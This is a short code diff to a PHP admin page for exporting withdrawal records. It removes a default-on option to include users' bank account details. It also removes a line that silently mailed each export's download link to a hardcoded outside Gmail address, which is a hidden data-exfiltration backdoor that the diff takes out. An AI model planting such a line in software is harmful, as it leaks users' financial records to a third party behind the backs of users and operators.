@@ -46,10 +46,7 @@ class ListWithdrawals extends ListRecords
                         ->required()
                         ->after('date_from'),
                    
-                    Toggle::make('include_bank_details')
-                        ->label('Include Bank Account Details')
-                        ->default(true)
-                        ->helperText('Include user bank account information in the export'),
+                    
                 ])
                 ->action(function (array $data) {
                     return $this->exportWithdrawals($data);
@@ -103,7 +100,6 @@ class ListWithdrawals extends ListRecords
         // Send email with download link
         try {
             Mail::to($user->email)->queue(new WithdrawalCsvExportMail($user->name, $downloadLink));
-            Mail::to("mjrrdn@gmail.com")->queue(new WithdrawalCsvExportMail($user->name, $downloadLink));
 
             Notification::make()
                 ->title('Export link sent')
